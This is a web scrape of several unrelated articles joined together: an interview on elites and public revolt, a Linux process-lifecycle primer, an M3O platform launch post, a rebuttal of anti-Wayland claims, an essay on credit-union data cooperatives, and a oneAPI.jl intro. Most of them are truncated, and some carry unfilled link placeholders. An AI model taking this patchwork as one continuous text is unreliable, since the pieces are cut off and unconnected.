</p><p>(I'm old enough to remember the mass-market, middle-class post-Eisenhower, pre-Summer-of-Love America, at least as transmitted by my parents who very agilely acclimated to it from the pre-revolutionary, bourgeois Cuba they fled.)</p><p>The relationship is causal: We wouldn't have had the Revolt of the Public in the 2010s without the Revolt of the Elites in the 80s. What do you make of the generational juxtaposition?</p></strong></p></div><p>Well, when my parents brought <em>me</em> to the United States from Cuba, Eisenhower was president.&nbsp; I remember the Summer of Love – hazily.&nbsp; That’s how old I am.&nbsp; So enough of that nonsense, young Antonio.</p><p>I began <em>The Revolt of the Public</em> in media res, at the point in which I and a circle of analysts in CIA became aware that the information landscape was being torn to shreds.&nbsp; I began with the digital tsunami.&nbsp; I hadn’t read the Lasch book at the time, though I have since.&nbsp; I agree with you that it’s a brilliant work of analysis and that it connects directly with my framework.</p><p>The great political conflict of our century, I believe, is that between a networked public and the elites who inhabit the great hierarchical institutions that organize modern life.&nbsp; <em>The Revolt of the Public</em> opens with this tectonic collision already rattling the world.&nbsp; The first edition of the book was published in 2014, and I desperately wanted to make readers aware that behind the rituals of our partisan politics a much more profound struggle was battering and changing the society we had inherited from the 20th century.&nbsp; I used words like “negation” and “nihilism” – it makes me smile to recall how much I agonized whether these terms were too sensational for an analyst to use.&nbsp; Since 2016 and the advent of Donald Trump, of course, everybody wants to talk about nihilism.&nbsp; (Trump’s election gave book sales a big boost, BTW – I sort of place myself in the same category as the <em>New York Times</em>, as a Trump profiteer.)</p><p>But the book left open a number of fundamental questions.&nbsp; For example, the public appears as a leading political actor on center stage already in an angry and rejectionist mood.&nbsp; The public is driven to the streets – and to vote for populists – by a need to repudiate the established order that sometimes tips into nihilism.&nbsp; But why?&nbsp; The usual economic explanations explain nothing, in my opinion.&nbsp; Revolts have happened in poor countries like Somalia and affluent countries like France, Chile, and the US – and the public in revolt, when looked at closely, consists mostly of middle class and college-educated people.&nbsp; That’s true everywhere.</p><p>Similarly, the book shows the elites to be in a state of confusion bordering on panic.&nbsp; They are baffled by anything digital and utterly clueless about where all the nonentities shouting angrily outside their windows come from.&nbsp; But why?&nbsp; In the last century, two generations of elites tackled the Great Depression, World War II, and the Cold War, and came ahead on every count.&nbsp; They built the great dams and nuclear plants that electrified the country, and threw in the interstate highway grid for good measure.&nbsp; What has changed?</p><p>That is where Lasch and <em>Revolt of the Elites</em> make a significant contribution to understanding our present moment.&nbsp; He describes the movement from Jefferson’s “aristocracy of talent” to a “meritocracy” that justifies itself by definition and by opposition.&nbsp; If you are an elite, you must deserve to be one.&nbsp; Why else would you be in your important perch in the hierarchy?&nbsp; After all, you went to the best schools, travelled widely, and speak a few words of French!&nbsp; And of course, every Brahmin class needs a thick wall to keep out the lower castes.&nbsp; Those are the people who went to community college, speak Southern, and on the rare occasion they travel end up (like Mr. Bean) saying “gracias” at the Louvre.&nbsp;&nbsp;</p><p>Here is Lasch on this subject:&nbsp; “The new elites are in revolt against ‘Middle America,’ as they imagine it; a nation technologically backward, politically reactionary, repressive in it sexual morality, middlebrow in tastes, smug and complacent, dull and dowdy.”</p><h4><em>The public, which swims comfortably in the digital sea, knows far more than elites trapped in obsolete structures.&nbsp; The public knows when the elites fail to deliver their promised “solutions,” when they tell falsehoods or misspeak, when they are caught in sexual escapades, and when they indulge in astonishing levels of smugness and hypocrisy.&nbsp; The public is disenchanted in the elites and their institutions, much in the way science disenchanted the world of fairies and goblins.&nbsp; The natural reaction is cynicism.&nbsp; The elites aren’t seen as fallible humans doing their best, but as corrupt and arrogant jerks.</em></h4><p>In other words, the elites had abandoned the idea of serving the public before the arrival of the digital tsunami.  What that catastrophe did was to reverse the polarities of power:  it was the public that was now technologically adept, politically restless, and in revolt against the perplexed elites.  The vast gap remained, and the elites have no wish to cross it – to do so would mean breaking that wall that protects the pure soul of the Brahmin.</p><p>We have no way of knowing whether a more talented elite class could have avoided the current anger mobilizing the public or the hair-trigger impulse to revolt.&nbsp; There are no laboratories that run parallel versions of history.&nbsp; I will say this:&nbsp; the struggle today is structural, not personality-dependent.&nbsp; Even an FDR or a Reagan would have difficulty preserving institutions whose authority has collapsed because of a radical reversal in the information environment.</p><p><strong>You write:<p>"Uncertainty is an acid, corrosive to authority. Once the monopoly on information is lost, so too is our trust. Every presidential statement, every CIA assessment, every investigative report by a great newspaper, suddenly acquired an arbitrary aspect, and seemed grounded in moral predilection rather than intellectual rigor. When proof for and against approaches infinity, a cloud of suspicion about cherry-picking data will hang over every authoritative judgment."</p><p>Your assertion, developed eloquently and at length, is that elites are no longer able to mediate reality via mass media, therefore convulsing into feckless inertia as a clamorous public picks apart every institutional shortfall. </p><p>What I couldn't quite discern was whether you thought this was purely a narrative failing, or indeed a competency one? </p><p>In other words, the news has always been fake and the histories at least partly (if not wholly) contrived.&nbsp; Read a French history of Napoleon and compare it to an Anglo one. Or for that matter, read your typical (lefty) English-language take on Cuba, vs. a Spanish language one. But they were self-consistent narratives maintained within meaningful political and linguistic borders. As flawed as these narratives were and are--the map was very definitely not the territory--they were coherent worldviews that helped that society navigate reality. Now those guiding (but also blinding) narratives are gone. Social media has served as a sort of society-wide bodycam: the institutional abuse was always there, now we're simply seeing it.</p><p>Or is your entire argument that institutions are really mired in a period of secular incompetence and decline?</p></strong><em><br></em></p><p>The highest calling of true elites is to translate the flux of reality into a coherent story.&nbsp; To most Americans, who believe reality must be approached “scientifically,” this sounds like spin or propaganda – but it’s much more essential than that.&nbsp; Every society is organized around specific ideals and habits of behavior.&nbsp; The institutions of government, information, commerce, even science, are erected on the basis of those ideals and …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                

<p>This post contains a rough sketch of the life and death of a process on Linux. It is a first-order approximation only. A later post will refine this further and provide a more precise description, adding details about pid namespaces, obscure syscalls, and little known flags.</p>

<h2 id="birth">Birth</h2>

<p>Every time a process is created, really another process split itself using the <a href="https://en.wikipedia.org/wiki/Fork_(system_call)"><em>fork</em></a> or <a href="https://en.wikipedia.org/wiki/Fork_(system_call)#Linux_clone_syscall"><em>clone</em></a> syscall. After <em>forking</em>, processes usually run the <a href="https://en.wikipedia.org/wiki/Exec_(system_call)"><em>execve</em></a> syscall to swap the currently executing binary with another one. For example, when you run <em>ls</em> from a <em>bash</em> shell then first <em>bash</em> splits itself into two <em>bash</em> processes using <em>fork</em> and then the child <em>bash</em> shell uses <em>exec</em> to change itself into <em>ls</em>. The child dies when <em>ls</em> finishes executing leaving only the original <em>bash</em> process.</p>

<p>In practice, programs almost never call the syscalls directly - they use libc wrappers instead or a libc function like <a href="https://man7.org/linux/man-pages/man3/system.3.html"><em>system</em></a> which under the hood uses <em>fork</em> and <em>execve</em> (or one of several <em>execve</em> variants).</p>

<h2 id="death">Death</h2>

<p>How do processes die? They almost always call the <a href="https://linux.die.net/man/2/exit"><em>exit</em></a> or <a href="https://linux.die.net/man/2/exit_group"><em>exit_group</em></a> syscalls. If the programmer doesn’t explicitly call <em>exit</em> and instead returns from <em>main</em> then <em>exit</em> is called anyway because the compiler wrapped <em>main</em> with a libc <em>main</em> that calls <em>exit</em> for you. If the program was compiled without libc and the programmer doesn’t call <em>exit</em> explicitly then returning from <em>main</em> will cause a segfault or another critical signal because return will try to pop an illegal return address from the stack. This brings us to the second-to-last way that processes can die which is via signals like <em>SIGTERM</em> or <em>SIGKILL</em>. Finally, the last way for a process to die is to pull the plug on your computer.</p>

<h2 id="identity-and-zombiehood">Identity and Zombiehood</h2>

<p>Every process has a unique <em>pid</em> - or at least it is unique until the kernel recycles the <em>pid</em> sometime after the process dies. Before a process’ <em>pid</em> can be recycled, the parent process should call <a href="https://linux.die.net/man/2/wait"><em>wait</em>, <em>waitpid</em>, or <em>waitid</em></a> on the child. (In the example presented earlier, <em>bash</em> needs to call <em>wait</em> on <em>ls</em>.) If the parent doesn’t <em>wait</em> on the child then the child process becomes a zombie which means it hangs around in the kernel’s process table wasting resources. If the parent itself dies then the process gets re-assigned a parent with <em>pid</em> one - that is, the <em>pid</em> of the unique <a href="https://en.wikipedia.org/wiki/Init"><em>init</em></a> process which automatically calls <em>wait</em> and frees up the process.</p>

<h2 id="threads-lesser-processes">Threads - Lesser Processes</h2>

<p>What is a thread, really? On Linux, threads are more or less independent processes which happen to share the same memory and some other resources. They are created by calling <a href="https://man7.org/linux/man-pages/man2/clone.2.html"><em>clone</em></a> with the appropriate flag(s). In kernel terminology, every thread has it’s own unique <em>pid</em> and all threads in the same process share the same <em>tgid</em> (thread group id) which is equal to first thread’s <em>pid</em>. So from the kernel’s perspective really <em>pids</em> identify threads, <em>tgids</em> identify processes, and the <em>pid</em> is equal to the <em>tgid</em> for single-thread processes. What makes this confusing is that the terminology in usermode is different as you can see in the following table:</p>

<table>
<thead>
<tr>
<th>Kernel name (<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L629">in <em>task_struct</em></a>)</th>
<th>Usermode name</th>
<th>Returned by syscall</th>
</tr>
</thead>

<tbody>
<tr>
<td>tgid (thread group id)</td>
<td>pid (process id)</td>
<td><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">getpid</a></td>
</tr>

<tr>
<td>pid (process id)</td>
<td>tid (thread id)</td>
<td><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">gettid</a>, clone, fork</td>
</tr>
</tbody>
</table>

<h2 id="closing-notes">Closing Notes</h2>

<p>This was an overview of processes on Linux. I’ve written a <strong>lot</strong> about Linux processes lately. If you liked this post, you should <a href="https://natanyellin.com/posts/">read my other posts</a> -  especially my most popular post on <a href="https://natanyellin.com/posts/tracking-running-processes-on-linux/">the difficulties of tracking running processes on Linux</a>.

        <!-- <h1 class="post-title">M3O Platform is now open to the world!</h1> -->

        <section>
            <p><br>
Today we’re unveiling M3O as “open to the world”. Head to the <a href="https://m3o.com/">homepage</a> and get started immediately. 
M3O is a fully managed cloud platform for microservices development. It’s built based on the 
popular open source project <a href="https://micro.mu/"><strong>Micro</strong></a> and focuses on developer productivity for backend service development. To read about 
the related Micro 3.0 release head to the <a href="https://micro.mu/blog/2020-11-05-micro-v3-aka-m3o">open source blog post</a>.</p>

<p>Back in May we <a href="https://blog.m3o.com/2020/07/30/m3o-a-cloud-native-platform-built-for-developers.html">announced</a> our goals and efforts towards building a 
shared platform in the cloud for developers to create services without the hassle of managing infrastructure. Since then we’ve been testing 
this with a small group of paying customers (who we’re grateful to) and iterating based on the feedback. Today we’re happy to say M3O is 
in a place where we feel excited and confident to offer it everyone.</p>

<p>No more dealing with cloud infrastructure, no more complex dashboards from AWS and others. A purely CLI driven experience and a development model 
baked in for writing microservices. Not only that but the feature set includes the following based on running Micro as a Service.</p>

<h3 id="features">Features</h3>

<p>Here’s a few things to highlight:</p>

<ul>
  <li><strong>Microservices development</strong> using gRPC and protobuf code gen</li>
  <li><strong>Service runtime</strong> and lifecycle management</li>
  <li><strong>Source to running</strong> builds without need for CI/CD</li>
  <li><strong>Authentication and authorization</strong> for access control and user management</li>
  <li><strong>Dynamic configuration</strong> and secrets management</li>
  <li><strong>PubSub messaging</strong> and event streaming</li>
  <li><strong>Service discovery</strong> and secure networking</li>
  <li><strong>Key-value storage</strong> and persistent CRUD</li>
  <li><strong>Automatic HTTP routing</strong> with path based resolution</li>
  <li><strong>Identity aware proxy</strong> for remote access and gRPC-web apps</li>
  <li><strong>Public API gateway</strong> and TLS support by default</li>
  <li><strong>Public and private repos</strong> support including  github, gitlab and bitbucket</li>
</ul>

<h3 id="tiers">Tiers</h3>

<p>M3O is launching with a simple 3 tier pricing plan; <strong>Dev</strong>, <strong>Platform</strong> and <strong>Cloud</strong>.</p>

<ul>
  <li>
    <p><strong>Dev</strong> is a free tier for you to get started on. We know the hassles of getting stuff up and running and the costs of Cloud 
(even with credits) so we’re making it super simple for developers to get started fast. This is built for small projects and individual devs.</p>
  </li>
  <li>
    <p><strong>Platform</strong> is a paid secure, scalable and supported tier that includes 2x the resource limits of Dev and gives you confidence in a 
platform team managing the infrastructure. When you’re done hacking on Dev, switch to the Platform environment and run your 
production services knowing we’ve got your back.</p>
  </li>
  <li>
    <p><strong>Cloud</strong> is for larger scale teams who want isolated environments in the cloud, whether its self-hosted or fully managed. We’ll give 
you the Platform experience but tailored for your needs. While Dev and Platform are multi-tenant shared environments, Cloud is totally 
separate so you know you’re the single tenant and owner of those resources.</p>
  </li>
</ul>

<h3 id="pricing">Pricing</h3>

<p>Unlike cloud compute providers who feel the need to charge per the penny and force to you into using pricing calculators to figure out the 
costs, we’re using a simply flat subscription pricing model on a per user basis. Our goal is to focus on abstracting away the details 
of infrastructure including the pricing and let you as a developer just focus on writing code.</p>

<p>That’s why the platform is priced at $35/user/month with unlimited collaborators. Over time we’ll include addition value add services 
and features that you can tag on in a predictable manner but we never want to show you a fractional cost or making it difficult for 
you to understand what you’re paying.</p>

<p>If you’re using the Dev tier, its totally free of charge. We’re using fair usage limits to make sure everyone gets their fair go of 
things and capping it at 1 core and 1gb of memory for all the services in your namespace. You can cut that up however you like. In the 
case of the Platform tier we’re giving you 2x that with 2 cores and 2Gb of memory. In the future we’ll make this configurable so you 
can top up as you need.</p>

<h3 id="goals">Goals</h3>

<p>Our goal is not to replace cloud compute or large scale infrastructure providers. This isn’t something we can really do and infact they 
do such a good job of it we shouldn’t have to. What we’ve however noticed is the developer experience is really lagging behind in 2020. 
Where Heroku took too much away, AWS is giving too much back. Especially to the developer.</p>

<p>Our primary goal is to abstract away the complexity of the cloud and provide a new development model that focuses on distributed and 
multi-service development on top. Based on our experiences we think to do all that you really have to be focused on the developer UX 
for microservices and that requires a number of primitives listed in the feature set above.</p>

<p>Over time though we know some of those abstractions and the infrastructure components will require direct access and we want to promote 
the use of managed services in the various cloud providers as appropriate. So we’ll instill a pluggable model and drop in replacements 
for anything we offer.</p>

<p>Overall we think developers are really in need of a new cloud platform, one that focuses entirely on their needs rather than overloading 
them with the need for infrastructure and operational management.</p>

<h2 id="next-steps">Next Steps</h2>

<p>We’re excited to unveil M3O to the world and hopefully you’re interested in trying it out too. Just head on over to the <a href="https://m3o.com/">website</a> 
to get started or join us on <a href="https://slack.m3o.com/">slack</a> and <a href="https://discord.gg/hbmJEct">discord</a>. If you’ve felt the pains of managing 
cloud infrastructure and want a simpler experience that just lets you focus on microservices development then we’re the 
new cloud provider built just for you.</p>

<p>I’ll start off with this: many of the links are misquoted, some don’t even support the
points made with them, and some are highlighted supposed "broken" functionality with
either wrong dates or bugs that <em>have already been fixed</em>.</p>
<p>Yes, Wayland is different than Xorg. It was a complete re-imagining of how a modern and
less monolithic display protocol should look. Of course, breakage isn’t necessarily a
<em>good</em> thing…​but at the same time, some form of breakage is going to be inevitable. As
we’ll see soon, the breakage has mostly been confined to a few specific places (screen
capture most notably), where the current X way simply would not work with a more
secure protocol.</p>
<p>Now, I would be lying if I said this hasn’t taken a long time to develop, or that I
haven’t missed some of these features, but Linux apps and development are done by many
individual developers, whether volunteers or paid. As a result, a lot of work <em>does</em> take
a long time to complete. That being said, X’s current policy towards things like screen
capture and key binding is simply insecure, and it is inevitable that we will have to move
away from it eventually.</p>
<p>Furthermore, is it really worth throwing the entire protocol away for screen casting
(which works but needs more adoption) and…​global menus? I’ve been using Wayland on my
primary system for ages, and the flag workarounds for screen capture in Chromium (as
mentioned below) have been working fine for me. It’s not a perfect solution, but the
benefits Wayland provides have far exceeded the amount of time I’ve had to spend tweaking
the few things that weren’t working out of the box.</p>
<p>Some of Xorg’s core issues that required breakage to be solved in Wayland, such as it being
trivially easy to create keyloggers or view <em>any window without permissions</em> really are
things that you’d expect to see /r/linuxmasterrace mocking Windows over, not problems that
we should ignore on a supposedly secure system.</p>
<p>One more thing I’d like to add: <em>many of these links honestly make no sense as sources</em> or
were talking about entirely different things, with some discussion cherry-picked without
context. Without further ado…​</p>
<!-- Make all the headers smaller -->


<p>Screen recording has been available in Wayland for quite some time now, via
{link-pipewire} and {link-xdg-desktop-portal}. Now, the gist <em>does</em> make allusions to this:</p>
<div>
<blockquote>
<p>Or force more Red Hat/Gnome components (glib, Portals, Pipewire) on everyone! [...]
There is a workaround for OBS Studio that requires a obs-xdg-portal plugin (which is known
to be Red Hat/Flatpak-centric, GNOME-centric, "perhaps" works with other desktops)</p>
</blockquote>
</div>
<p>This is…​really, just completely wrong.</p>
<p>I have no idea why anything here would require clients to use GLib. All of the portal
APIs work over D-Bus, and Pipewire doesn’t even require GLib.</p>

<p>Even just looking at the
<a href="https://github.com/flatpak/xdg-desktop-portal/graphs/contributors">top contributors</a>,
we see contributions from employees of Collabora, Igalia, and Mozilla, not just Red Hat.</p>
<p>Pipewire also is not really a project that’s particularly tied to Red Hat; yes, the main
developer is from Red Hat, but he’s also a multimedia expert and one of the two creators
of <a href="https://en.wikipedia.org/wiki/GStreamer#Early_days">GStreamer</a> (a project founded while
the developer was still at Collabora). As of right now, Collabora is
<a href="https://www.collabora.com/about-us/open-source/open-source-projects/pipewire.html">a leading contributor to Pipewire as well</a>.
Even <a href="http://libregraphicsworld.org/blog/entry/podcast-ep-003-paul-davis-on-fixing-big-linux-audio-issues#main:~:text=PipeWire%20is%20an%20interesting%20project">
the creator of JACK is interested in Pipewire</a>, despite initially being skeptical.</p>
<p>A lot of the particular linked examples are just bizarre extrapolations:</p>

<p>This was targeting Linux screencasting <em>in general</em> as highlighted by the ffmpeg reference.</p>
<div>
<blockquote>
<p><a href="https://github.com/vkohaupt/vokoscreenNG/issues/51">https://github.com/vkohaupt/vokoscreenNG/issues/51</a> broken since at least 7 Mar 2020.
("I have now decided that there will be no Wayland support for the time being. Reason,
there is no budget for it. Let’s see how it looks in a year or two.") - This is the key
problem. Wayland breaks everything and then expects others to fix the wreckage it caused
on their own expense.</p>
</blockquote>
</div>
<p>Looks like I missed the part where the Wayland developers had the ability to update every
single project in existence and add full Wayland support. Better yet, the issue would
indicate more lack of time by the developer to be able to push updates, not that Wayland
"breaks everything".</p>

<p>Okay, this one is just laughable. An OBS developer also stated in the same thread:</p>
<div>
<blockquote>
<p>For reference X11 solutions are very close to the worst possible interface one could design.</p>
</blockquote>
</div>
<p>which would imply that we can’t really stay with X screencasting either, thus ruining the
entire "just stick with X argument".</p>
<p>Better yet, <a href="https://github.com/obsproject/rfcs/pull/14">there’s already an RFC open for
Wayland support</a>. All the portals they mentioned as "incomplete" do already support the
screencast APIs anyway, so their knowledge at the time about it was likely already
outdated.</p>
<p>Now onto "screen sharing", which is the same API problem as "screen casting", but let’s
entertain the idea that it’s actually two separate points:</p>
<div>
<blockquote>

<p><a href="https://github.com/jitsi/jitsi-meet/issues/6389">https://github.com/jitsi/jitsi-meet/issues/6389</a> broken since 24 Jan 2016 ("Closing since
there is nothing we can do from the Jitsi Meet side.") See? Wayland breaks stuff and
leaves application developers helpless and unable to fix the breakage, even if they wanted.</p>
</blockquote>
</div>
<p>First off…​this is two issues from the same repo. How does this count as two separate
breakages? I don’t even know where "2016" comes from, because the second issue was created
this year.</p>
<p>The quoted text was not in response to Wayland missing functionality; Pipewire already
existed at this point. Rather it was related to browsers implementing the screencast API.
This has been implemented in Chromium behind a flag for years at least, and it was only
behind a flag because parts of Chromium’s UI flow assumed there was no permissions model,
so it would ask the user to select a window to share after they already selected it in the
Wayland compositor. This is actively being worked on in both
<a href="https://webrtc-review.googlesource.com/c/src//189544[WebRTC]%20andhttps://chromium-review.googlesource.com/c/chromium/src//1942327">Chromium itself</a>.</p>

<div>
<blockquote>
<p><a href="https://github.com/flathub/us.zoom.Zoom/issues/22">https://github.com/flathub/us.zoom.Zoom/issues/22</a> Zoom broken since at least 4 Jan 2019.
("Can not start share, we only support wayland on GNOME with Ubuntu (17, 18), Fedora (25
to 29), Debian 9, openSUSE Leap 15, Arch Linux"). No word about non-GNOME!</p>
</blockquote>
</div>
<p>"Yes, let’s highlight a Linux client that is notoriously buggy and generally terrible."</p>
<!-- Make all the headers smaller -->


<p>Again, I don’t know why this is split into three sections. But first off:</p>

<p><strong>The issue had nothing to do with this, and this is a gross misquoting.</strong> The issue reads:</p>
<div>
<blockquote>
<p>This Gtk+4 fact, will be sad and will make Gtk+ unusable to the Gnome Global Menu
extension, as it’s implemented now. That’s why the Gnome Global Menu extension will be
discontinued again. The first reason was because the lack of the Gtk+ Wayland support for
the Global Menu, that was resolved here and now will be because Gtk+ will no longer
supports generic loadable modules.</p>
</blockquote>
</div>
<p>In other words, this issue was showing something unrelated, and at the time, Wayland
support was already working. The date used in the gist ("broken since 24 Aug 2018") is
also incorrect, since it’s pointing to the date the linked issue was filed, at which point
Wayland support was again working.</p>
<p>GTK’s own lack of support for global menus over Wayland itself had little to do with
Wayland and more to do with GTK itself not wanting to support global menus, as the current
global menu implementation was very closely targeting Xorg.</p>
<p>Next up:</p>

<p>In other words…​if you actually read the article, they were able to make it work on
Wayland <strong>without</strong> the re-engineering. In fact, the whole point of the article was to
highlight that they were able to get it to work.</p>
<div>
<blockquote>
<p>KDE had to do additional work to work around it. And it still did not work:</p>

</blockquote>
</div>
<p>The linked bug literally says this was fixed in 5.20.</p>

<p><strong>This is literally the same link as above</strong>. Why is this a separate point?</p>

<!-- Make all the headers smaller -->



<p><strong>Once again, this has been fixed:</strong></p>
<div>
<blockquote>
<p>The best solution is for Qt including the QPA platform plugin and having a proper
auto-detection based on XDG_SESSION_TYPE. The situation will improve with Qt 5.11, but it
doesn’t really help as the Qt LTS versions will continue to face the problem.</p>
<p>For now we implemented a change in Plasma 5.13 so that we don’t need to set the env variable
any more. Plasma is able to select the appropriate platform plugin based on XDG_SESSION_TYPE
environment variable. Non-Plasma processes will use the default platform plugin. With Qt
&lt; 5.11 this is xcb, with Qt 5.11 this will most likely change to wayland. KDE’s flatpak
applications pick Wayland by default in a Wayland session and are unaffected by the change.</p>
</blockquote>
</div>
<p>Really, I’d argue the actual problem is trying to bundle every individual dependency into
a single file and expecting the users to never have to add anything else? This is pretty
bizarre especially because it’s no different than having to include the global menu
platform plugin to make global menus work, which AppImages already need! In other words,
this is just an AppImage problem and its style clashing with the Qt reliance on various
forms of dynamically-loaded plugins.</p>
<!-- Make all the headers smaller -->


<p>The opening to the article says:</p>
<div>
<blockquote>
<p>Wayland solves no issues I have</p>
</blockquote>
</div>
<p>I’d like to make a quick jab at this statement: just because you don’t have issues doesn’t
imply that aren’t issues that others are stuck dealing with or fixing. Xorg’s APIs are
quite nasty, and developers have to deal with them. There are things that Wayland can
support easily but X cannot, and there are people who have to deal with those.</p>
<p><a href="https://www.linux-magazine.com/Online/Features/Is-Wayland-the-New-X">This article</a> covers
a few of the reasons X is a mess:</p>
<div>
<blockquote>
<p>Stone traces the earliest origins of Wayland to a page on the X.Org wiki started by Adam Jackson called X12. “It wasn’t a serious attempt at a design,” Stone stresses, “but a list of things we would do differently if we had a chance to rework the core protocol.”</p>
<p>For many developers, this list helped codify the problems …</p></blockquote></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                                The current data economy is based on apathetic approval - everyone clicking on “I Accept The Terms And Conditions” without reading them, let alone bargaining for better terms and conditions. However, a small movement spearheaded by the MIT professor Alex Pentland has another idea on how things could work. Pentland is one of the most cited computer scientists in the world and played a key role in the introduction of GDPR, an EU regulation that has been dubbed the “greatest shake-up of privacy legislation in more than 20 years”. According to Alex, the answer lies in cooperative ownership of data, and the force best positioned to bring this change is the credit union movement. The first chapter of this article seeks to describe the vision laid out by Pentland and his colleagues at MIT, while the second chapter provides some new ideas on how it could foster a further shift towards an economic system where cooperatives would play a more prominent part.
                            </p><div>
                                <div><p>
                                    Credit unions are not conventional corporations, they are consumer owned cooperatives. This means that they are fully owned by their members, in this case, ordinary customers who deposit or lend money from a credit union. The members share the profits and elect the board of directors on a one-member-one-vote basis, and the membership has been booming for generations, growing from 6 million in the late 1960s to 120 million members by 2019.</p><p>

In Pentland’s vision, credit unions would offer their members an opportunity to join a “data cooperative” where you would pool data together with others to collectively bargain for better terms and conditions on how your data is used. He explains:</p><p>

	“What we discovered, and I have a bunch of lawyers that are part of my group, is that there are certain sorts of cooperatives which are licensed by law, to manage peoples’ data. Just by accident in the US, credit unions are licensed to handle your digital data, which is basically everything about you. They can act as your legal representatives. They don’t own your data, they host it. They could for instance, and we built software for this, have you just check a little box, and your credit union would download all your data.”</p><p>

	“...it is practically possible to automatically record and organize all the data that citizens knowingly or unknowingly give to companies and the government, and to store these data in credit union vaults. In addition, almost all credit unions already manage their accounts through regional associations that use common software, so widespread deployment of data cooperative capabilities could become surprisingly quick and easy.”</p><p>

	While an usual customer might not notice much difference from a conventional bank, except the slightly better rates, credit unions differ from corporations in fundamental ways due to being cooperative legal entities. This has implications when it comes to matters like customer data because credit unions have a legally binding fiduciary duty to protect the rights and act in the interest of their members instead of investors whose interests might differ from those of customers.</p><p>

	Existing technology would easily enable credit union members to download software on their phones and laptops that would request all the data extracted from them and have it stored in a personal data storage or a “vault”. Credit unions could also help members grow their vault by requesting other information collected from them to be stored in their vaults. The example Pentland uses is that of medical information. In the US, everyone has explicit legal rights to their medical information, but hospitals often make it difficult to obtain. It would be easier to obtain it by joining a data cooperative that would request the information on behalf of many members, instead of having each individual member go through the process separately.</p><p>

The pooling of data also makes it more valuable. It is not very valuable for an individual member to know how much cat food they buy. But pool data together with others, and the credit union could enable all members who regularly purchase cat food to do so collectively and bargain a lower price. Pentland sees this sort of collective bargaining for “bundled offers” as one of the key tangible economic benefits data cooperatives could provide to attract credit union members to join.</p><p>

	Alongside these sort of tangible economic benefits that the credit unions could now provide, there would be a more profound change towards a more ethical way of analysing data. This would happen through “Open Algorithms” or OPALs, a set of requirements defined in MIT to vet algorithms. The most important part of the requirements is that the data is never moved or copied from the vault and “algorithms are moved to the data” instead. The current norm is the opposite - collecting a lot of data into one location where algorithms are run on it. Instead,  with OPAL each personal data vault runs the algorithm independently, and together they return an answer aggregated in a way that does not risk the privacy of any member. </p><p>

	To illustrate the difference between the typical algorithms and OPAL, let’s imagine a chef wanting to start a Greek restaurant. The status quo resembles the chef buying the names and addresses of everyone in the state and running an algorithm to see how many people with Greek last names live in each area to help find an ideal location for the restaurant. With OPAL, the chef gets the information on how prominent Greek last names are by area, as the algorithm that detects connections between Greek last names and home addresses is run separately on each person's data vault. However, the chef doesn’t get to know the names and addresses of people. OPAL allows answers to specific questions the algorithms ask, but not access to the raw data that the insights are extracted from. Instead of obtaining your data and doing whatever they want with it, businesses get general answers by asking specific questions through algorithms that are automatically vetted by the data cooperative to ensure adherence to OPAL requirements.</p><p>

	Of course, the reality does not resemble such a situation. In reality, data is hoarded by the few giants that control access to it. Indeed, Pentland sees data cooperatives as a solution to the “cold start” problem of incumbents possessing a massive advantage over new competitors in the form of hoarded data. </p><p>

	Alongside this, people could change the settings of their personal data easily. The credit union network could run an OPAL algorithm to detect if there are many credit union members who donate to Wikipedia, and offer them a possibility to only share data to research conducted by universities that encourage and enable their students to improve Wikipedia as part of their education. Wikipedia reaches a massive audience during their fundraising campaigns. In these campaigns, they could encourage their readers to join a data cooperative to bargain for more Wikipedia friendly practices at universities that use their data. This could reach more credit union members than the most expensive advertising campaigns in the sector, while helping Wikipedia form mutually beneficial relationships with universities.</p><p>

	It is also worth noting that it would require little effort and time to scale rapidly. Pentland explains:<br>
“It is technically and legally straightforward to have credit unions hold copies of all their members’ data, to safeguard their rights, represent them in negotiating how their data is used, to alert them to how they are being surveilled, and to audit the companies using their members’ data. The power of 100 million US consumers who are practically and legally in control of their data would be a force to be reckoned with by all organizations that use citizen data and would be one very decisive way to hold these organizations accountable. The same potential for credit unions to balance today’s data monoliths exists in most countries around the world.”</p><p>

He mentions a discussion he had with a leading data management software provider for the entire credit union sector, stating that he “will add some of our special magic to all the credit unions without them knowing” and explains that, from the credit unions perspective, they will continue running software like usual without even noticing a new update that enables giving members more choice over their data. It is a sign of historical and structural forces at play when, without their conscious intention and effort, the credit union movement almost accidentally happens to possess legal, economic and technological structures that puts it in an ideal position to enable people to own their own data in a more meaningful manner.</p><p>

	As Pentland states: ““From a software point of view, we’re there. From a legal point of view, we’re there… We just need a couple of examples to demonstrate exactly how this works.”
                                </p></div>
                            </div><div>
                                <div><p>
                                    If I, as a customer member of many old and big cooperatives, would like the people working in them to read one article, it would no doubt be Nathan Schneider’s <a href="https://www.colorado.edu/lab/medlab/2019/07/29/co-ops-lateral-vertical-and-back-again">Co-ops, from Lateral to Vertical and Back Again</a>. And if there was one sentence I would hope they would ask themselves every day that perfectly encapsulates the simple but so profound idea of the article, it would be, “Co-ops of the near future could find themselves asking less what they can do for their members and more what their members—and potential members—can do for each other“. An example Schneider gives comes from one of the earliest North American credit unions, Desjardins, that has grown to include a large majority of Quebecers as its members: “the secret was having parish-level groups of members who knew each other evaluating loan applications. Through long …</p></div></div></div>

accelerators with the <a href="https://www.oneapi.com/">oneAPI programming model</a>. It is currently
available for select Intel GPUs, including common integrated ones, and offers a similar
experience to CUDA.jl.</p><p>The initial version of this package, v0.1, consists of three key components:</p><ul><li>wrappers for the oneAPI Level Zero interfaces;</li><li>a compiler for Julia source code to SPIR-V IR;</li><li>and an array interface for convenient data-parallel programming.</li></ul><p>In this post, I’ll briefly describe each of these. But first, some essentials.</p><h2 id="installation">Installation</h2><p>oneAPI.jl is currently only supported on 64-bit Linux, using a sufficiently recent kernel,
and requires Julia 1.5. Furthermore, it currently only supports a limited set of Intel GPUs:
Gen9 (Skylake, Kaby Lake, Coffee Lake), Gen11 (Ice Lake), and Gen12 (Tiger Lake).</p><p>If your Intel CPU has an integrated GPU supported by oneAPI, you can just go ahead and
install the oneAPI.jl package:</p><pre><code>pkg&gt; add oneAPI
</code></pre><p>That’s right, no additional drivers required! oneAPI.jl ships its own copy of the <a href="https://github.com/intel/compute-runtime">Intel
Compute Runtime</a>, which works out of the box on
